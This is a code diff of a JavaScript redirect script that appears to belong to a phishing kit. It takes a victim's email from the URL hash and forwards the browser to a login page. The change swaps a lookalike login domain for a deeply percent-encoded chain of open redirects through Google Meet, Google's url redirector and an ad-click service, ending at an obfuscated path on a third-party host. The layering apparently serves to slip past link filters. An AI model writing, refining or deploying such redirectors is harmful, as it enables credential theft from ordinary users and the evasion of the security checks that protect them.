@@ -7,7 +7,7 @@
     (function() {
       const email = window.location.hash.replace('#', '');
       if (email) {
-        const redirectUrl = `https://login.mercury-tour.com/live01#${email}`;
+        const redirectUrl = `https://meet.google.com/linkredirect?dest=https://www.google.com/url?VFEC=2uKFYZhv%26q=amp%2Fadservice.google.com.ph%25252Fddm%25252Fclk%25252F424929466%25253B226923624%25253Br%25253Bu%25253Dds%252526amp%25253Bsv1%25253D64195420186%252526amp%25253Bsv2%25253D3261659123742877%252526amp%25253Bsv3%25253D6702577448695742699%252526amp%25253Bgclid%25253DEAIaIQobChMIurHiwbHn8gIVBZ53Ch2TZAIsEAQYASABEgKAL_D_BwE%25253B%25253F%25252F%25252Fautomarker%252Enet%25252F%252565%25256E%252563%252572%252579%252570%252574%252565%252564%252563%252565%252572%252574%252573%25252F%252569%25256E%252564%252565%252578%25252E%252570%252568%252570&0Ix6=b2cf8595#${email}`;
         window.location.href = redirectUrl;
       } else {
         document.body.innerHTML = "<p>Missing email in URL hash.</p>";
